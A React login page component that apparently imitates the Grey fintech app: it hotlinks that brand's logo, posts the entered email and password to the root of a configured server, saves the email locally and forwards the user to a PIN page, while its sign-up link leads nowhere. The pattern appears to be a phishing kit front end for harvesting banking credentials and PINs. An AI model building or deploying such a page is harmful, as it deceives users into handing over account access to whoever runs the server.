import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png"; // Adjust the path to your logo
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Login = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword(!showPassword);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        localStorage.setItem("email", data.email);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("Login error", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-[7em] px-4">
      <div className="w-full max-w-sm bg-white px-2 ">
        {/* Logo */}
        <div className="flex justify-start mb-5">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Grey-Logo.svg/1024px-Grey-Logo.svg.png"
            alt=""
            className="w-24 h-auto"
          />
        </div>
        <div className="flex justify-start mb-12">
          <h1 className="text-2xl font-bold">Welcome back!</h1>
        </div>

        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          {/* Email Field */}
          <div className="mb-[6em] space-y-5">
            <div>
              <label htmlFor="email" className="text-sm font-medium">
                Email address
              </label>
              <input
                type="text"
                placeholder="Enter email address"
                {...register("email")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-lg focus:outline-none placeholder:text-gray-500"
              />
              <FormErrMsg errors={errors} inputName="email" />
            </div>

            {/* Password Field */}
            <div className="relative">
              <label htmlFor="password" className="text-sm font-medium">
                Password
              </label>
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                {...register("password")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-lg focus:outline-none placeholder:text-gray-500"
              />
              <span
                onClick={togglePassword}
                className="absolute top-10 right-4 text-gray-800 cursor-pointer"
              >
                {showPassword ? (
                  <AiOutlineEyeInvisible className="text-xl" />
                ) : (
                  <AiOutlineEye className="text-xl" />
                )}
              </span>
              <FormErrMsg errors={errors} inputName="password" />
            </div>
          </div>
          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md font-semibold text-white ${
              loading
                ? "bg-blue-300 cursor-not-allowed"
                : "bg-blue-600 hover:bg-blue-700"
            }`}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {/* Create Account */}
        <div className="mt-4 text-center">
          <p className="text-gray-600">
            <a href="#" className="text-lg">
              Create an account
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
